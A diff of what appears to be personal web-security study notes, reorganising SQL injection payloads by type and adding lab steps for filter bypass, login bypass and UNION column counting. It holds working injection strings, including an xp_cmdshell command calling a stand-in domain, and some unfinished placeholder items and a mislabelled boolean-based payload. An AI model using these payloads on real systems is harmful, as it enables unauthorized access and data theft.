@@ -50,21 +50,51 @@
 - time delays
 
 **Basic SQL**  
-- ' OR 1=1 --
+- `' OR 1=1 --`
 
-**Union-Based Injection**  
-- ' UNION SELECT 1, username, password FROM users -
+**In-band: Error-Based Injection**  
+- `'; SELECT 1/0 --`
 
-**Error-Based Injection**  
-- '; SELECT 1/0 --
+**In-band: Union-Based Injection**  
+- Determine the number of columns required: `' ORDER BY 1--`  OR `' UNION SELECT NULL,NULL--`
+- Retrieve othe records: `' UNION SELECT 1, username, password FROM users --`
 
-**Time-Base Injection**  
-- '; WAITFOR DELAY '0:0:10' --
+**Blind: Boolean-based Injection**  
+- `'; WAITFOR DELAY '0:0:10' --`
+- 
+**Blind: Time-Base Injection**  
+- `'; WAITFOR DELAY '0:0:10' --`
 
 **Out-of-Band (OOB) Injection**  
-- '; EXEC xp_cmdshell('nslookup yourdomain.com') --
+- `'; EXEC xp_cmdshell('nslookup yourdomain.com') --`
 
 ### Lab
+1. SQL injection vulnerability in WHERE clause allowing **retrieval of hidden data**
+   - GET /filter?category=`' OR 1=1 --`
+   - Verify that the response now contains one or more unreleased products
+2. SQL injection vulnerability allowing **login bypass**
+   - POST /login
+   - modify the body parameter username=`administrator'--`&password=password
+5. SQL injection **UNION** attack, determining the **number of columns** returned by the query
+   - GET /filter?category=`' UNION SELECT NULL,NULL,NULL--`
+7. Item 4
+8. Item 5
+9. Item 6
+10. Item 7
+11. Item 8
+12. Item 9
+13. Item 10
+14. Item 11
+15. Item 12
+16. Item 13
+17. Item 14
+18. Item 15
+19. Item 16
+20. Item 17
+21. Item 18
+22. 
+
+
 
 ## Path Traversal
 Content for Path Traversal...
